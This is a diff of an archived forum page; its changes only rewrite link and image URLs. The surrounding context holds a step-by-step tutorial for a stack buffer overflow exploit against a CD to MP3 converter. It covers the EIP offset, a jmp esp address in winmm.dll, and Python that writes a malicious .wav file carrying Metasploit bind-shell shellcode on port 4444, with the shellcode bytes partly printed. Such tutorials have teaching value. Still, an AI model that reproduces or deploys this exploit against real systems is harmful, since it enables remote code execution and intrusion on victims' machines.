@@ -562,8 +562,8 @@ Now too much of boring Grandpa Talks !! Let’s get the ball rolling !!<br/>
 <br/>
 In this tutorial i will start from scratch and build a working exploit.<br/>
 <br/>
-A public exploit for this is already available here   <a href="../external.html?link=http://www.exploit-db.com/exploits/15480/" target="_blank">http://www.exploit-db.com/exploits/15480/</a> <br/>
-First step is downloading and installing the  vulnerable application from here  <a href="../external.html?link=http://www.exploit-db.com/application/15480" target="_blank">http://www.exploit-db.com/application/15480</a><br/>
+A public exploit for this is already available here   <a href="http://www.exploit-db.com/exploits/15480/" target="_blank">http://www.exploit-db.com/exploits/15480/</a> <br/>
+First step is downloading and installing the  vulnerable application from here  <a href="http://www.exploit-db.com/application/15480" target="_blank">http://www.exploit-db.com/application/15480</a><br/>
 <br/>
 Install Immunity Debugger or ollydbg or  windbg anyone of it would do .<br/>
 <br/>
@@ -576,10 +576,10 @@ Now we will write a simple python code which will generate a .wav file and test 
 Save the above code as crash.py and execute it .This little code upon execution will generate a file with the name of crash.wav <br/>
 <br/>
 Open the debugger of your  choice in my case immunity debugger  . Open the Executable of CD to MP3 converter and then click on execute.<br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 <br/>
 Now open your Crash.wav file in CD to MP3 converter in option wav to wav converter and BOOM the application Dies instantly . Now check your Debugger for what exactly happened .<br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 <br/>
 Woot Woot Eip has been overwritten . This means that if we somehow put our shellcode in any one of the registers and make the EIP point to it then we can have a working exploit for this application <img alt="" border="0" class="inlineimg" src="images/smilies/biggrin.png" title="Big Grin"/> .<br/>
 <br/>
@@ -596,7 +596,7 @@ Check the Debugger again and you can see some numbers in the EIP which in my cas
 Now in Cygwin Shell we will run pattern_offset to check where exactly EIP is being overwritten .<br/>
 Syntax:<br/>
 ./pattern_offset.rb 31684630 5000<br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 And the location it gives me is 4112  great.<br/>
 <br/>
 So Just to Cross Check that the position of EIP given by the tool is correct we will write a small script .<br/>
@@ -608,18 +608,18 @@ handle.write(Crap<br/>
 Again open the program through immunity debugger Execute it <br/>
 <br/>
 After the application crashes check the Eip and you find there 42424242 which means the address found by the tool is perfect .<br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 <br/>
 Now we have to find the location of a command in dll file which calls/goes to esp like jmp esp etc.<br/>
 <br/>
 Now we will load the the application again in debugger and search jmp esp command in every dll that is  being loaded .( In immunity debugger we can take a look at executable<br/>
 module screen and double click on each dll that is being loaded and then search for the specific command in that address space.<br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 After some tinkering out I found that the dll winmm.dll has a jmp esp command at 76B43ADC .<br/>
 <br/>
 Great now  we have almost everything we need to make a workable exploit .<br/>
 <br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 <br/>
 <br/>
 The address 76 B4 3A DC will be mentioned as \xDC \x3A \xB4 \x76 since we are passing it as a string to EIP .<br/>
@@ -629,7 +629,7 @@ We will use win32 bind shell provided by metasploit encoded in alpha2 encoder <b
 We will add some NOPS ( no operation bytes) before starting our shellcode because generally some bytes at the starting are not interpreted by processor as command so it could cause our exploit to fail . Adding Nops would increase the reliability of exploit .<br/>
 <br/>
 And we get a telnet connection \m/<br/>
-<img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/><br/>
+<img alt="" border="0" src="http://imageshack.com/e/p5aMES7Yj"/><br/>
 <br/>
 [P.S] You will have to write your  own exploit(modify EIP) as the addresses might differ .<br/>
 <br/>
@@ -640,7 +640,7 @@ P.S : here's the Shellcode<br/>
 handle=open("final.wav","a")<br/>
 Crap="\x41"*4112<br/>
 Eip="\xDC\x3A\xB4\x76"<br/>
-# win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 <a href="../external.html?link=http://metasploit.com/" target="_blank">http://metasploit.com</a><br/>
+# win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 <a href="http://metasploit.com/" target="_blank">http://metasploit.com</a><br/>
 ShellCode=("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\x  ff\x49\x49\x49\x49\x49\x49"<br/>
 "\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x49\  x51\x5a\x6a\x43"<br/>
 "\x58\x30\x41\x31\x50\x41\x42\x6b\x41\x41\x53\x32\  x41\x42\x41\x32"<br/>
@@ -1549,7 +1549,7 @@ google_ad_height = 90;
 		
 		
 		<li><a href="archive/index.html">Archive</a></li>
-		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		<li><a href="#" target="_blank">Web Hosting</a></li>
 		
 		
 		<li><a href="entryef12.html?b=76#top" onclick="document.location.hash='top'; return false;">Top</a></li>
@@ -1574,7 +1574,7 @@ google_ad_height = 90;
 
 <div class="shade footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
 <div class="shade footer_morecopyright" id="footer_morecopyright">
